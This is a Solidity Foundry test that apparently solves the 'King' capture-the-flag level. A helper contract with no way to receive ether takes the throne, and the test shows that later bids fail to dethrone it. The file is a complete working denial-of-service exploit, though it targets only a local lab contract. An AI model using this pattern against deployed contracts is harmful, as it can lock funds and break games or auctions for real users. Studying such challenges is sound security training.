// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {King} from "../src/09_King.sol";

contract AbsoluteKing{
    function sendEth(address payable _from, uint256 _value) public {
        require(address(this).balance >= _value);
        _from.call{value: _value}("");
    }
}
contract KingTest is Test {
    King public kg;
    AbsoluteKing public ak;

    address public hacker = address(0x1337);

    receive() external payable {}

    function setUp() public {
        kg = new King();
        ak = new AbsoluteKing();
        vm.deal(address(ak), 1 ether); 
        vm.deal(hacker, 10 ether);
    }

    function testExploit() public {
        vm.startPrank(hacker);
        console.log("initial king", kg._king());
        ak.sendEth(payable(address(kg)), 1 ether);
        console.log("king after hack", kg._king());
        address(kg).call{value: 10 ether}("");
        console.log("king doesn't changed", kg._king());
        assertEq(kg._king(), address(ak));
        vm.stopPrank();
    }
}